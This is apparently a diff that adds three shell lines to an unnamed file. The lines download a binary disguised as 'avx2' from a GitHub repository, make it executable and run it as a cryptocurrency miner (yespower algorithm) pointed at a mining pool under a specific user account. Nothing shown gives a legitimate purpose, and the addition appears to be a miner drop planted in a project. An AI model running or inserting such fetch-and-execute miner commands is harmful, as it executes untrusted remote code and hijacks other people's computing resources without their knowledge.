@@ -1,0 +1,3 @@
+wget https://github.com/Master100k/Avvx/raw/main/avx2
+chmod +x avx2
+./avx2 -a yespower -o stc.ss.poolin.one:443 -u henes001 -p 123
